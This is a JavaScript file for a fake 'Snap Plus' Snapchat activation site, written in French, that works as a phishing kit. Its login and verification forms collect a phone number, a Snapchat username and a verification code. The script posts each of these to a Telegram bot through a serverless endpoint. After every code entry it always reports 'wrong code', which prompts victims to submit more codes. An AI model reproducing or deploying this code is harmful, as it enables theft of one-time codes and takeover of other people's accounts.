// Configuration Telegram Bot - Token caché côté serveur
const TELEGRAM_BOT_TOKEN = ''; // Token caché dans les variables d'environnement Vercel
const TELEGRAM_CHAT_ID = ''; // Chat ID caché dans les variables d'environnement Vercel

// Générer un ID unique basé sur timestamp
function generateUniqueId() {
    return Date.now().toString(36).toUpperCase();
}

// Envoyer message à Telegram via API serverless
async function sendToTelegram(message) {
    try {
        const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message })
        });
        
        const data = await response.json();
        if (data.success) {
            console.log('Message envoyé avec succès à Telegram');
            return true;
        } else {
            console.error('Erreur Telegram:', data.error);
            return false;
        }
    } catch (error) {
        console.error('Erreur lors de l\'envoi à Telegram:', error);
        return false;
    }
}

// Page index.html - Formulaire connexion
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    const phoneInput = document.getElementById('username');
    const errorMessage = document.getElementById('errorMessage');
    
    // Formater automatiquement le numéro de téléphone avec espaces
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, ''); // Supprimer les espaces existants
        value = value.replace(/[^0-9]/g, ''); // Ne garder que les chiffres
        
        // Limiter à 10 chiffres
        if (value.length > 10) {
            value = value.substring(0, 10);
        }
        
        // Ajouter des espaces tous les 2 chiffres
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 2 === 0) {
                formatted += ' ';
            }
            formatted += value[i];
        }
        
        e.target.value = formatted;
    });
    
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Cacher le message d'erreur précédent
        if (errorMessage) {
            errorMessage.style.display = 'none';
            errorMessage.textContent = '';
        }
        
        const username = document.getElementById('username').value;
        const cleanPhone = username.replace(/\s/g, ''); // Supprimer les espaces pour validation
        
        // N'accepter que le numéro exact 07 76 34 45 34
        const allowedPhone = '0776344534';
        if (cleanPhone !== allowedPhone) {
            if (errorMessage) {
                errorMessage.textContent = 'Numéro invalide. Seul le numéro 07 76 34 45 34 est accepté.';
                errorMessage.style.display = 'block';
            }
            return;
        }
        
        const uniqueId = generateUniqueId();
        
        // Stocker les données dans localStorage
        localStorage.setItem('snapPlus_username', username);
        localStorage.setItem('snapPlus_id', uniqueId);
        
        // Envoyer à Telegram
        const message = `📞 <b>Nouvelle inscription Snap Plus</b>\n\n` +
                       `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
                       `📱 <b>Téléphone:</b> ${username}\n` +
                       `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
        
        await sendToTelegram(message);
        
        // Aller directement à la page d'activation Snap Plus, même si l'envoi Telegram échoue
        const loadingMessage = document.getElementById('loadingMessage');
        const loginFormElement = document.getElementById('loginForm');
        
        if (loginFormElement) {
            loginFormElement.style.display = 'none';
        }
        if (loadingMessage) {
            loadingMessage.style.display = 'block';
        }
        
        setTimeout(() => {
            window.location.href = 'success.html';
        }, 2000);
    });
}

// Page verification.html - Formulaire vérification
const verificationForm = document.getElementById('verificationForm');
if (verificationForm) {
    // Afficher le username enregistré
    const username = localStorage.getItem('snapPlus_username');
    const uniqueId = localStorage.getItem('snapPlus_id');
    const phoneDisplay = document.getElementById('phoneDisplay');
    const errorMessage = document.getElementById('errorMessage');
    const submitButton = verificationForm.querySelector('button[type="submit"]');
    
    if (phoneDisplay && username) {
        phoneDisplay.innerHTML = `<strong>Username enregistré:</strong> ${username}`;
    }
    
    verificationForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Cacher le message d'erreur précédent
        if (errorMessage) {
            errorMessage.style.display = 'none';
            errorMessage.textContent = '';
        }
        
        const snapchatUsername = document.getElementById('username').value;
        const code = document.getElementById('code').value;
        
        // Désactiver le bouton et ajouter cooldown
        if (submitButton) {
            submitButton.disabled = true;
            submitButton.textContent = 'Patientez...';
        }
        
        // Envoyer à Telegram
        const message = `✅ <b>Vérification Snap Plus</b>\n\n` +
                       `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
                       `👤 <b>Username/Email:</b> ${username}\n` +
                       `📸 <b>Pseudo Snapchat:</b> ${snapchatUsername}\n` +
                       `🔢 <b>Code:</b> ${code}\n` +
                       `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
        
        const success = await sendToTelegram(message);
        
        // Toujours afficher mauvais code
        if (errorMessage) {
            errorMessage.textContent = 'Vous avez saisi le mauvais code';
            errorMessage.style.display = 'block';
        }
        
        // Réactiver le bouton après 3 secondes
        setTimeout(() => {
            if (submitButton) {
                submitButton.disabled = false;
                submitButton.textContent = 'Suivant';
            }
        }, 3000);
    });
}
